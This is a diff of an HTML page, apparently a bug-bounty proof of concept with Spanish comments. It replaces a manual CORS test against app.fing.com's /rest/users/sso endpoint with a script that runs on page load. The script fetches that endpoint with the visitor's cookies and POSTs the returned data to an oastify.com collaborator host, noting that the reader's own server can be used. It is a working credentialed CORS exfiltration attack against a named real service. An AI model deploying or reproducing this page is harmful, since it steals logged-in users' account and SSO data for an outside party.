@@ -1,34 +1,28 @@
 <!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>PoC CORS con app.fing.com</title>
-</head>
-<body>
-  <h1>Prueba de CORS con <code>app.fing.com/rest/users/sso</code></h1>
-  <button onclick="probarCORS()">Hacer fetch</button>
-  <pre id="output">Esperando respuesta...</pre>
+<html>
+  <head>
+    <title>CORS Exploit PoC</title>
+  </head>
+  <body>
+    <h2>Explotando CORS desde origen malicioso</h2>
+    <script>
+      // Endpoint vulnerable que devuelve datos sensibles
+      fetch("https://app.fing.com/rest/users/sso", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        console.log("Datos obtenidos:", data);
 
-  <script>
-    async function probarCORS() {
-      try {
-        const response = await fetch('https://app.fing.com/rest/users/sso', {
-          method: 'GET',
-          credentials: 'include', // si se necesita enviar cookies
-          headers: {
-            'Content-Type': 'application/json'
-          }
+        // Exfiltración a tu servidor
+        fetch("https://aky3b8far5ksmy0lcr6h8e0suj0ao0cp.oastify.com/" /* o tu propio servidor */, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ datos: data })
         });
-
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-        
-        const data = await response.text(); // puede ser .json() si esperas JSON
-        document.getElementById('output').textContent = data;
-      } catch (error) {
-        document.getElementById('output').textContent = 'Error: ' + error;
-        console.error(error);
-      }
-    }
-  </script>
-</body>
+      })
+      .catch(console.error);
+    </script>
+  </body>
 </html>
